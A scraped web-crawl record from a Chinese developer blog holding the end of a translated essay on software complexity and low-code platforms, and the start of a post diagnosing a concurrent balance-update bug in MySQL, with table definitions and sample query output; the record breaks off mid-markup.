语言取代汇编语言编写程序也同样带来了类似的优势。可以预见，在未来，语言设计不大可能带来如同过去几十年一样的改进。</p>\n<p>然而也有很多其他不需要让语言更具有表现力的方法，可以精简构建软件的代码总量。截止到现在，在过去的二十年里，我们最大的收获是开源软件（OSS）。如果没有个人和公司将资金投入到他们为社区免费赠予的软件中，没有这么多的代价和努力，那么我们今天所构建的大部分软件将不会实现。</p>\n<p>这些项目使我们能够站在巨人的肩膀上解决问题，利用工具让我们更专注于解决业务问题，而不是花时间建设基础设施。</p>\n<p>也就是说，业务是复杂的。可笑的复杂，而且只会更多，开源软件非常适合生成用以构建系统的框架和工具，但在很大程度上为了获得关注，又必须解决大量人员共享的问题。因此，大多数开源项目要么是相对通用的，要么是处于非常受欢迎的领域。因此，这些工具中的大部分都是建立系统的绝佳平台，但最终我们仍然需要在日益复杂且要求苛刻的系统中构建所有业务逻辑和接口。</p>\n<p>所以我们剩下的是一个看起来像这样的栈（对于 web 应用程序）…</p>\n<blockquote><p>&lt;Our Code/我们的代码&gt;<br>\n&lt;Libraries/库&gt;<br>\n&lt;Web Framework/Web 框架&gt;<br>\n&lt;Web Server/Web 服务器&gt;<br>\n&lt;Data Stores/数据存储&gt;<br>\n&lt;Operating System/操作系统&gt;</p></blockquote>\n<p>“Our Code”部分最终变得非常复杂，因为它反映了业务及其流程。如果我们有自定义的业务逻辑和自定义流程，那么我们只需编写组建应用程序的接口、工作流程和逻辑即可。当然，我们可以尝试用不同的方式来记录该逻辑（记住业务规则引擎？），但最终，没有其他人会为您的业务编写业务逻辑。实际上似乎没有办法解决这个问题……至少是在机器人到来并将我们从工作中解救出来之前。</p>\n<h3>不喜欢代码，那么低代码（Low-Code）如何？</h3>\n<p>如果我们必须开发应用程序的接口、工作流程和逻辑，这听起来像是难住我们了，对吗？ 在某种程度上，是的，但我们仍有几个选择。</p>\n<p>对于大多数开发者来说，软件等于代码，现实并非如此。 开发软件有许多方法，其中一种是使用可视化工具。 在网络普及之前，视觉开发和 RAD 工具在市场上占有更大的地位。 诸如 PowerBuilder、visual Foxpro、Delphi、VB 和 Access 等工具都具有可视化设计功能，允许开发人员在不输入任何代码的情况下创建界面。</p>\n<p>这些工具涵盖了需要编写的代码，但总的来说，你可以直观地设计应用程序，然后编写大量代码来实现应用程序的逻辑。 在很多情况下，你仍然用编程操作接口，因为使用这些工具构建的接口通常是静态的。 但是，对于大量应用程序，这些工具通过舍弃其他性能获得了巨大的生产力，主要是以灵活性为代价。</p>\n<p>自从网络兴起后，这些工具可能已经不再流行，但公司对它们的渴望并没有降低，尤其是因为势不可挡的软件需求仍然持续不断。 整个行业最新趋势是“低代码”系统。 低代码开发工具是最新一代拖放式软件开发工具的现代术语。 这些工具和其他工具之间最大的区别在于，它们主要基于 Web（和移动端），并且通常被托管于云平台。</p>\n<p>许多公司正活跃于这些平台上。Salesforce（App Cloud）、Outsystems、Mendix 以及 Kony 等厂商承诺能够比“传统”应用程序开发快许多倍。 虽然他们的很多说法可能很夸张，但也有一定的可信度。依赖类似上述平台的所有弊端，可能的确导致某些类型的程序比使用 .NET 或 Java 的传统程序开发更快。</p>\n<h3>那么，问题是什么呢？</h3>\n<p>的确有几个问题。 首先，有经验的开发人员经常讨厌这些工具。 大多数严肃的开发人员™ 喜欢使用真实代码™ 编写真正的软件™。 我知道这听起来像我正在迎合一群呜咽的婴儿（也许我有点儿），但如果你传递的核心价值是技术，那么采用顶尖开发人员不喜欢使用的工具并非是个好主意。</p>\n<p>其次，像我这样的人看着这些被封装的平台，说“不，不要在这里构建应用程序”。这是合情合理的忧虑，也是最让我困扰的事情。</p>\n<p>如果你 10 年前用 PHP 搭建了一个应用程序，那么这个应用程序可能会显老，但它现在仍然可以嗡嗡作响。 语言和生态系统都是开源的，并由社区维护的。 你需要保持应用程序持续更新，却不必担心供应商断定不再值得花时间支持。</p>\n<blockquote><p>像我这样的人看着这些被封装的平台，说“不，不要在这里构建应用程序”。这是合情合理的忧虑，也是最让我困扰的事情。</p></blockquote>\n<p>如果你 10 年前选择了有自己平台的供应商，那么如果他们关闭工具或频繁更改工具（<a href=\"https://techcrunch.com/2017/01/30/facebooks-parse-developer-platform-is-shutting-down-today/\">还记得 Parse 么？</a>），你可能会被迫重写程序。或者更糟，你的系统会停滞在一个停止更新、不再支持服务的平台上。</p>\n<p>有很多理由去警惕这类平台，但对许多企业来说，以更少的付出来搭建软件太具诱惑以至于不忍拒绝。 软件的复杂性仍在持续，不幸的是软件工程师帮不上任何忙。</p>\n<h3>什么需要改变？</h3>\n<p>有高效的平台，可以让我们用真实代码™ 构建真正的软件™，但不幸的是，软件行业太过担心于跟随科技巨头地领导，以至于没有意识到他们的工具并没有对项目添加任何价值。</p>\n<p>我无法告诉你有多少次，曾遇到开发人员跟我说，相比于仅仅渲染 HTML，构建单一页面应用程序（SPA）类似的东西并不会增加开销。我曾听开发人员说过，所有应用都应该基于 NoSQL 数据库来开发，而关系数据库逐渐没落了。也曾听开发人员质疑为什么应用程序不是用 CQRS 和事件溯源编写的。</p>\n<p>正是这种思维过程和常规的开销导致公司认为软件开发过于昂贵。 你可能会说，“但事件溯源如此优雅！在微服务之上搭建 SPA 如此整洁！”当然，它可能是，但对你这种正在写十个微服务的人来说不是这样的。这种额外的复杂性往往是<strong>不必要的</strong>。</p>\n<p>作为从业人员，我们需要找到各种方法来简化搭建软件的过程，并且不忽视业务的合理复杂性。 我们需要承认，并非每个应用程序都需要与 Gmail 相同层次的界面复杂性和运营扩展性。 有很多应用程序需要经过深思熟虑的界面、复杂的逻辑、坚实的体系结构、流畅的工作流程等。但不需要微服务、AI、chatbots、NoSQL、Redux、Kafka、Containers 或任何类似的工具。</p>\n<p>如今很多开发人员似乎对技术能力非常着迷，以至于他们不能退后一步，问问自己是否真的需要这些。</p>\n<p>就像 MasterChef 上的人一样，他们以分子美食家的身份入场兜售自己。 他们将原料分成不同的组成部分，使用科学配对口味的方法，然后用大量的二氧化碳和液氮来制作你见过的最有创意的食物。 然后他们会在一两集之后被踢开，因为他们忘记了大多数烹饪的核心原则，即食物需要口感好。 他们似乎真的很惊讶于没有人喜欢他们发酵的茴香和芒果精华珍珠加上抹了鳀鱼沫的鳕鱼肉。</p>\n<p>对灵活性、可组合性和机敏性的痴迷正在给我们带来巨大的痛苦，并迫使公司远离我们所喜爱的平台和工具。 并不是说我上面列出的那些工具不会增加价值，尽管大公司在大规模操作系统时会遇到典型问题，工具也仅是为了解决真正的痛点而产生的。</p>\n<p>我所说的是，我们需要回到简单化的方向，并开始以更简单的方式创造事物，而不是仅仅一直讨论简单性。 也许我们可以依靠更多的<strong>集成</strong>技术栈来提供开箱即用的模式和工具，以便软件开发人员能够更高效地创建软件。</p>\n<blockquote><p>我们将把越来越多的业务添加到“低代码”平台和其他通过简化、移除起初写过的代码来降低软件成本的工具中。</p></blockquote>\n<p>我们需要停止假装二十行的程序是一些需要认真手工缝制的独特挂毯。</p>\n<h3>聚焦简单性</h3>\n<p>写完之后，我仿佛听到一百万位开发人员磨刀的声音，但我相信如果我们继续坚持如下方向：想写所有东西、配置一切、编写所有内容、无论多大规模的问题都使用相同的堆栈，那么我们将把越来越多的业务添加到“低代码”平台和其他通过简化、移除起初写过的代码来降低软件成本的工具中。</p>\n<p>我们对业务日益复杂的回答不会增加开发过程的复杂性 – 无论它看起来多么优雅。</p>\n<p>我们必须设法通过简化开发流程来管理复杂性。 因为管理复杂性是次重要的责任，我们必须始终记住软件开发人员最重要的责任：通过使用软件来实现价值。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113820\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113820votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113820\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx138099575\">风木</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx138099575\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/e496dcafc16ff266b061f892352783db.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx138099575\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx138099575/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx138099575/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"微博主页\" target=\"_blank\" href=\"https://weibo.com/6426355449/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo&amp;is_all=1\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "业界", "url": "http://blog.jobbole.com/113820/", "url_obj_id": "627fba360f907b35e30cde7e75e233df"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "线上账务系统余额并发更新问题记录", "create_date": "2018/04/24 ·", "praise_num": 1, "fav_num": 1, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/hebaodan/blog/917141\">hebaodan</a>   </div><p>某电商平台，某天线上用户报bug说账户余额信息与交易流水对不上。可以认为是数据库并发更新问题，由此定位出具体原因，并给出解决方案。</p>\n<h2>问题现象</h2>\n<h3>场景描述</h3>\n<p>线上账务系统，在定时结算给卖家钱时，且高并发量的情况下，出现提现x元（假设当前用户余额为x元）余额为0后，再转入该账户一笔钱（假设为y元），结果账户余额变为了<strong>x+y</strong> 元，导致用户余额错误。 ps：账户余额的变更都是在事务中update的</p>\n<p><strong>环境说明</strong></p>\n<p>mysql5.7 + innodb，事务隔离级别是<strong>REPEATABLE-READ</strong></p>\n<h3>场景模拟</h3>\n<p>我们简化下线上的数据结构，进行场景模拟。 数据表如下： ‘账户主表’</p>\n<p> </p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9316d03f553571955\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE user (\r\nuid int(11) NOT NULL COMMENT '类型id+自增序列',\r\nname varchar(32) DEFAULT NULL,\r\nPRIMARY KEY (uid)\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='账户主表'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d03f553571955-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d03f553571955-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d03f553571955-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d03f553571955-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d03f553571955-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9316d03f553571955-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">user</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d03f553571955-2\"><span class=\"crayon-e\">uid </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMENT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'类型id+自增序列'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d03f553571955-3\"><span class=\"crayon-e\">name </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">32</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d03f553571955-4\"><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">uid</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d03f553571955-5\"><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ENGINE</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">InnoDB </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHARSET</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">utf8 </span><span class=\"crayon-v\">COMMENT</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'账户主表'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>‘账户余额明细表’</p>\n<p> </p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9316d048784042221\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE user_account (\r\nuid int(11) NOT NULL,\r\namount decimal(19,4) DEFAULT 0 COMMENT '账户余额',\r\nPRIMARY KEY (uid)\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='账户余额明细表'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d048784042221-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d048784042221-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d048784042221-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d048784042221-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d048784042221-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9316d048784042221-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">user_account</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d048784042221-2\"><span class=\"crayon-e\">uid </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d048784042221-3\"><span class=\"crayon-e\">amount </span><span class=\"crayon-e\">decimal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">19</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMENT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'账户余额'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d048784042221-4\"><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">uid</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d048784042221-5\"><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ENGINE</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">InnoDB </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHARSET</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">utf8 </span><span class=\"crayon-v\">COMMENT</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'账户余额明细表'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>账户类型配置</p>\n<p> </p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9316d04c793819997\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE user_conf (\r\ntype_id int(11) NOT NULL, description varchar(32) DEFAULT NULL COMMENT '类型描述', PRIMARY KEY (type_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='账户类型配置'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d04c793819997-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04c793819997-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04c793819997-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">user_conf</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04c793819997-2\"><span class=\"crayon-e\">type_id </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">description </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">32</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMENT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'类型描述'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">type_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ENGINE</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">InnoDB </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHARSET</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">utf8 </span><span class=\"crayon-v\">COMMENT</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'账户类型配置'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>具体数据为：</p>\n<p> </p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9316d04f727663207\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect * from user;\r\n+-------+------+ | uid | name | +-------+------+\r\n| 10001 | a |\r\n| 10002 | b |\r\nselect * from user_account;\r\n+-------+----------+ | uid | amount | +-------+----------+\r\n| 10001 | 10.0000 |\r\n| 10002 | 108.9900 |\r\nselect * from user_conf;\r\n+---------+--------------+ | type_id | description | +---------+--------------+\r\n| 100 | 外部账户 |\r\n| 200 | 内部账户 |</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" 